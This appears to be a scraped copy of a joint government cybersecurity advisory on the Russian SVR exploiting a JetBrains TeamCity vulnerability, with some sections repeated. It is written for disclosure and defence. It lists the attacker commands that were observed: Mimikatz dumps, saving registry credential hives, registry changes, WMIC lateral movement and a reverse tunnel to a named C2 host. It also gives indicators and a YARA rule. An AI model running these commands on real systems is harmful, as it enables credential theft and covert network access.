        // 48 05 20 00 00 00                       add     rax, 20h ; ' '        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 0A A6 0D 00                    lea     rdx, unk_14011E546        // 41 B8 30 00 00 00                       mov     r8d, 30h ; '0'        // E8 69 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 40 00 00 00                       add     rax, 40h ; '@'        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 1B A6 0D 00                    lea     rdx, unk_14011E577        // 41 B8 70 01 00 00                       mov     r8d, 170h        // E8 49 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 60 00 00 00                       add     rax, 60h ; '`'        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 6C A7 0D 00                    lea     rdx, unk_14011E6E8        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'        // E8 29 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 80 00 00 00                       add     rax, 80h        // 48 89 C1                                mov     rcx, rax        // 48 8D 15 7C A7 0D 00                    lea     rdx, unk_14011E718        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'        // E8 09 B5 FE FF                          call    sub_14002F4B0        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]        // 48 05 A0 00 00 00                       add     rax, 0A0h        $op_decrypt_config = {            48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]            48 05 A0 00 00 00        }
    condition:        all of them}




Note: These rules are meant for threat hunting and have not been tested on a larger dataset.
MITIGATIONS
The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Apply available patches for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023, if not already completed.
Monitor the network for evidence of encoded commands and execution of network scanning tools.
Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.
Require use of multi-factor authentication [CPG 1.3] for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.

Organizations should adopt multi-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.


Keep all operating systems, software, and firmware up to date. Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization’s security baseline and incorporate into enterprise monitoring tools.
Audit log files to identify attempts to access privileged certificates and creation of fake identity providers.
Deploy software to identify suspicious behavior on systems.
Deploy endpoint protection systems with the ability to monitor for behavioral indicators of compromise.
Use available public resources to identify credential abuse with cloud environments.
Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see previous tables).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES

FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders
NSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied Networks
CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise
CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments
CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations
CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber Activity
FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. Think Tanks
CISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development
NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development

The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.
VERSION HISTORY
December 12, 2023: Initial version.
APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793
On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:
[2023-09-26 11:53:46,970]   INFO - ntrollers.FileBrowseController - File edited: C:\ProgramData\JetBrains\TeamCity\config\internal.properties by user with id=1[2023-09-26 11:53:46,970]   INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified by ""user with id=1""[2023-09-26 11:53:58,227]   INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe ""/c whoami""
An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy, the HTTP proxy may have suitable logs showing the following target endpoints being accessed:

/app/rest/users/id:1/tokens/RPC2 – This endpoint is required to exploit the vulnerability.
/app/rest/users – This endpoint is only required if the attacker wishes to create an arbitrary user.
/app/rest/debug/processes – This endpoint is only required if the attacker wishes to create an arbitrary process.

Note: The user ID value may be higher than 1.
APPENDIX B – IOCS
File IoCs
GraphicalProton backdoor:

01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732
34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E
620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869
773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13
7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53
8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7
971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC
CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF
CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43
EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E
F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB
C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4
4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166

GraphicalProton HTTPS backdoor:

18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93
19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641
1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8
219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67
92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6
B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7
C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD
C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0
C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3
F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69

Backdoored vcperf:

D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443

Backdoored Zabbix installation archive:

4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F

Backdoored Webroot AV installation archive:

950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4

Modified rsockstun

CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF

Network IoCs
Tunnel Endpoints

65.20.97[.]203
65.21.51[.]58

Exploitation Server

103.76.128[.]34

GraphicalProton HTTPS C2 URL:
hxxps://matclick[.]com/wp-query[.]php







This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'T1003.002', 'T1562.001', 'T1027.001', 'T1020', 'T1098', 'T1203', 'T1564', 'T1567', 'T1190', 'T1068', 'T1558.001', 'T1210', 'T1003.001', 'T1572', 'T1049', 'T1590', 'T1564.001', 'T1547', 'T1592.002', 'T1003', 'T1046', 'T1568', 'T1057', 'T1505.001', 'T1574.002', 'T1059.001', 'T1590.004', 'T1033', 'T1047', 'T1053.005', 'T1059.003', 'T1055', 'T1555.003', 'T1036'}","



SUMMARY
The U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.
Software developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations. Although the SVR used such access to compromise SolarWinds and its customers in 2020, limited number and seemingly opportunistic types of victims currently identified, indicate that the SVR has not used the access afforded by the TeamCity CVE in a similar manner. The SVR has, however, been observed using the initial access gleaned by exploiting the TeamCity CVE to escalate its privileges, move laterally, deploy additional backdoors, and take other steps to ensure persistent and long-term access to the compromised network environments.
To bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions. The authoring agencies recommend all organizations with affected systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities using the IOCs provided in this CSA. If potential compromise is detected, administrators should apply the incident response recommendations included in this CSA and report key findings to the FBI and CISA.
Download the PDF version of this report:


AA23-347A Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally
(PDF,       774.65 KB
  )


For a downloadable copy of IOCs, see:


AA23-347A STIX XML
(XML,       76.99 KB
  )




AA23-347A STIX JSON
(JSON,       69.29 KB
  )


THREAT OVERVIEW
SVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence, a broad concept that for Russia encompasses information on the politics, economics, and military of foreign states; science and technology; and foreign counterintelligence. The SVR also conducts cyber operations targeting technology companies that enable future cyber operations.
A decade ago, public reports about SVR cyber activity focused largely on the SVR’s spear phishing operations, targeting government agencies, think tanks and policy analysis organizations, educational institutions, and political organizations. This category of targeting is consistent with the SVR’s responsibility to collect political intelligence, the collection of which has long been the SVR’s highest priority. For the Russian Government, political intelligence includes not only the development and execution of foreign policies, but also the development and execution of domestic policies and the political processes that drive them. In December 2016, the U.S. Government published a Joint Analysis Report titled “GRIZZLY STEPPE – Russian Malicious Cyber Activity,” which describes the SVR’s compromise of a U.S. political party leading up to a presidential election. The SVR’s use of spear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily targeting diplomatic agencies. In 2023, SKW and CERT.PL published a Joint Analysis Report describing tools and techniques used by the SVR to target embassies in dozens of countries.
Less frequently, reporting on SVR cyber activity has addressed other aspects of the SVR’s foreign intelligence collection mission. In July 2020, U.S., U.K., and Canadian Governments jointly published an advisory revealing the SVR’s exploitation of CVEs to gain initial access to networks, and its deployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations involved in COVID-19 vaccine development. Although not listed in the 2020 advisory did not mention it, the authoring agencies can now disclose that the SVR’s WellMess campaign also targeted energy companies. Such biomedical and energy targets are consistent with the SVR’s responsibility to support the Russian economy by pursuing two categories of foreign intelligence known as economic intelligence and science and technology.
In April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies. At least some of this targeting was aimed at enabling additional cyber operations. Following this attribution, the U.S. and U.K. Governments published advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the SVR’s use of “low and slow” password spraying techniques to gain initial access to some victims’ networks, exploitation of a zero-day exploit, and exploitation of Microsoft 365 cloud environments.
In this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers. JetBrains issued a patch for this CVE in mid-September 2023, limiting the SVR’s operation to the exploitation of unpatched, Internet-reachable TeamCity servers. While the authoring agencies assess the SVR has not yet used its accesses to software developers to access customer networks and is likely still in the preparatory phase of its operation, having access to these companies’ networks presents the SVR with opportunities to enable hard-to- detect command and control (C2) infrastructure.
TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool. While SVR followed a similar playbook in each compromise, they also adjusted to each operating environment and not all presented steps or actions below were executed on every host.
Initial Access - Exploitation
The SVR started to exploit Internet-connected JetBrains TeamCity servers, in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server. The authoring agencies' observations show that the TeamCity exploitation usually resulted in code execution, with high privileges granting the SVR an advantageous foothold in the network environment. The authoring agencies are not currently aware of any other initial access vector to JetBrains TeamCity currently being exploited by the SVR.
Host Reconnaissance
Initial observations show the SVR used the following basic, built-in commands to perform host reconnaissance,:

whoami /priv
whoami /all
whoami /groups
whoami /domain
nltest -dclist
nltest -dsgetdc
tasklist
netstat
wmic /node:""""<redacted>"""" /user:""""<redacted>"""" /password:""""<redacted>"""" process list brief
wmic /node:""""<redacted>"""" process list brief
wmic process get commandline -all
wmic process <proc_id> get commandline
wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed
powershell (,adsisearcher,""((samaccountname=<redacted>))"").Findall().Properties
powershell (,adsisearcher,""((samaccountname=<redacted>))"").Findall().Properties.memberof
powershell Get-WmiObject -Class Win32_Service -Computername
powershell Get-WindowsDriver -Online -All

File Exfiltration
Additionally, the authoring agencies have observed the SVR exfiltrating files, which may provide insight into the host system’s operating system:

C:\Windows\system32\ntoskrnl.exe to precisely identify system version, likely as a prerequisite to deploy EDRSandBlast.
SQL Server executable files - based on the review of the post exploitation actions, the SVR showed an interest in specific files of the SQL Server installed on the compromised systems:

C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll,
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll
C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\secforwarder.dll


Visual Studio files – based on the review of the post exploitation actions, the SVR showed an interest in specific files of the Visual Studio:

C:\Program Files (x86)\Microsoft Visual Studio\2017\SQL\Common7\IDE\VSIXAutoUpdate.exe
Update management agent files – based on the review of the post exploitation actions, the SVR showed an interest in executables and configuration of patch management software:

C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd\bin\httpd.exe
C:\Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd
C:\ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf





Interest in SQL Server
Based on the review of the exploitation, the SVR also showed an interest in details of the SQL Server,:

powershell Compress-Archive -Path ""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlmin.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllos.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqllang.dll"",""C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqltses.dll"" -DestinationPath C:\Windows\temp\1\sql.zip
SVR cyber actors also exfiltrated secforwarder.dll

Tactics Used to Avoid Detection
To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver”, technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software,.
This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims,. Additionally, executables that are likely to be detected (i.e. Mimikatz) were executed in memory,.
In several cases SVR attempted to hide their backdoors via:

Abusing a DLL hijacking vulnerability in Zabbix software by replacing a legitimate Zabbix DLL with their one containing GraphicalProton backdoor,
Backdooring an open source application developed by Microsoft named vcperf. SVR modified and copied publicly available sourcecode. After execution, backdoored vcperf dropped several DLLs to disc, one of those being a GraphicalProton backdoor,
Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate DLL with one containing GraphicalProton backdoor.

To avoid detection by network monitoring, the SVR devised a covert C2 channel that used Microsoft OneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware via OneDrive and Dropbox were hidden inside randomly generated BMP files, illustrated below:

 


Privilege Escalation
To facilitate privilege escalation, the SVR used multiple techniques, including WinPEAS, NoLMHash registry key modification, and the Mimikatz tool.
The SVR modified the NoLMHash registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d ""0"" /f

The SVR used the following Mimikatz commands,:

privilege::debug
lsadump::cache
lsadump::secrets
lsadump::sam
sekurlsa::logonpasswords

Persistence
The SVR relied on scheduled tasks, to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:

C:\Windows\temp
C:\Windows\System32
C:\Windows\WinStore

The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments passed to schtasks.exe, which can be found in Appendix B – Indicators of Compromise.
To secure long-term access to the environment, the SVR used the Rubeus toolkit to craft Ticket Granting Tickets (TGTs),.
Sensitive Data Exfiltration,
The SVR exfiltrated the following Windows Registry hives from its victims,:

HKLM\SYSTEM
HKLM\SAM
HKLM\SECURITY

In order to exfiltrate Windows Registry, the SVR saved hives into files, packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\ directory.

reg save HKLM\SYSTEM """"C:\Windows\temp\1\sy.sa"""" /y
reg save HKLM\SAM """"C:\Windows\temp\1\sam.sa"""" /y
reg save HKLM\SECURITY """"C:\Windows\temp\1\se.sa"""" /y
powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q

In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins.
SVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to obtain a sensitive Domain information.
Network Reconnaissance
After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance,. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory,. The SVR executed the following PowerSploit commands:

Get-NetComputer
Get-NetGroup
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""
Get-NetDiDomain
Get-AdUser
Get-DomainUser -UserName
Get-NetUser -PreauthNotRequire
Get-NetComputer | select samaccountname
Get-NetUser -SPN | select serviceprincipalname

Tunneling into Compromised Environments
In selected environments the SVR used an additional tool named, “rr.exe”—a modified open source reverse socks tunneler named Rsockstun—to establish a tunnel to the C2 infrastructure,.
The authoring agencies are aware of the following infrastructure used in conjunction with “rr.exe”:

65.20.97,.,203:443
Poetpages,.,com:8443

The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC), utility after dropping it to disk:

wmic process call create ""C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554-0sddsf2@34232fsl45t31""

Lateral Movement
The SVR used WMIC to facilitate lateral movement,.

wmic /node:""""<redacted>"""" /user:""""<redacted>"" /password:""""<redacted>"""" process call create """"rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost""""

The SVR also modified DisableRestrictedAdmin key to enable remote connections,.
It modified Registry using the following reg command:

reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d ""0"" /f

Adversary Toolset
In the course of the TeamCity operation, the SVR used multiple custom and open source available tools and backdoors. The following custom tools were observed in use during the operation:

GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs, to exchange data with the SVR operator.
After execution, GraphicalProton gathers environment information such as active TCP/UDP connections, running processes, as well as user, host, and domain names,. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel,. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files - with both commands and results,. Directory name is re-randomized each time the GraphicalProton process is started.
BMP files that were used to exchange data were generated in the following way:


Compress data using zlib,
Encrypt data using custom algorithm,
Add “***” string literal to encrypted data,
Create a random BMP with random rectangle,
And finally, encode encrypted data within lower pixel bits.

While the GraphicalProton backdoor has remained mostly unchanged over the months we have been tracking it, to avoid detection the adversary wrapped the tool in various different layers of obfuscation, encryption, encoders, and stagers. Two specific variants of GraphicalProton “packaging” are especially noteworthy – a variant that uses DLL hijacking, in Zabbix as a means to start execution (and potentially provide long-term, hard-to-detect access) and a variant that masks itself within vcperf, an open-source C++ build analysis tool from Microsoft.

GraphicalProton HTTPS variant – a variant of GraphicalProton backdoor recently introduced by the SVR that forgoes using cloud-based services as a C2 channel and instead relies on HTTP request.To legitimize the C2 channel, SVR used a re-registered expired domain set up with dummy WordPress website. Execution of HTTPS variant of GraphicalProton is split into two files – stager and encrypted binary file that contains further code.


MITRE ATT&CK TACTICS AND TECHNIQUES
See below tables for all referenced threat actor tactics and techniques in this advisory. For additional mitigations, see the Mitigations section.











INDICATORS OF COMPROMISE
Note: Please refer to Appendix B for a list of IOCs.
VICTIM TYPES
As a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW, CERT Polska, and NCSC have identified a few dozen compromised companies in the United States, Europe, Asia, and Australia, and are aware of over a hundred compromised devices though we assess this list does not represent the full set of compromised organizations. Generally, the victim types do not fit into any sort of pattern or trend, aside from having an unpatched, Internet-reachable JetBrains TeamCity server, leading to the assessment that SVR’s exploitation of these victims’ networks was opportunistic in nature and not necessarily a targeted attack. Identified victims included: an energy trade association; companies that provide software for billing, medical devices, customer care, employee monitoring, financial management, marketing, sales, and video games; as well as hosting companies, tools manufacturers, and small and large IT companies.
DETECTION METHODS
The following rules can be used to detect activity linked to adversary activity. These rules should serve as examples and adapt to each organization’s environment and telemetry.
SIGMA Rules

YARA rules
The following rule detects most known GraphicalProton variants.

Note: These rules are meant for threat hunting and have not been tested on a larger dataset.
MITIGATIONS
The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Apply available patches for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023, if not already completed.
Monitor the network for evidence of encoded commands and execution of network scanning tools.
Ensure host-based anti-virus/endpoint monitoring solutions are enabled and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.
Require use of multi-factor authentication,CPG 1.3, for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.

Organizations should adopt multi-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.


Keep all operating systems, software, and firmware up to date. Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization’s security baseline and incorporate into enterprise monitoring tools.
Audit log files to identify attempts to access privileged certificates and creation of fake identity providers.
Deploy software to identify suspicious behavior on systems.
Deploy endpoint protection systems with the ability to monitor for behavioral indicators of compromise.
Use available public resources to identify credential abuse with cloud environments.
Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see previous tables).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REFERENCES

FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders
NSA, CISA, FBI, Joint Cyber Security Advisory, Russian SVR Targets U.S. and Allied Networks
CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise
CISA, Alert (AA21-008A), Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments
CISA, Alert (AA20-352A), Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations
CISA, CISA Insights, What Every Leader Needs to Know About the Ongoing APT Cyber Activity
FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. Think Tanks
CISA, Malicious Activity Targeting COVID-19 Research, Vaccine Development
NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID-19 Vaccine Development

The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.
VERSION HISTORY
December 12, 2023: Initial version.
APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793
On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:,2023-09-26 11:53:46,970,   INFO - ntrollers.FileBrowseController - File edited: C:\ProgramData\JetBrains\TeamCity\config\internal.properties by user with id=1,2023-09-26 11:53:46,970,   INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\ProgramData\JetBrains\TeamCity\config\internal.properties was modified by ""user with id=1"",2023-09-26 11:53:58,227,   INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe ""/c whoami""
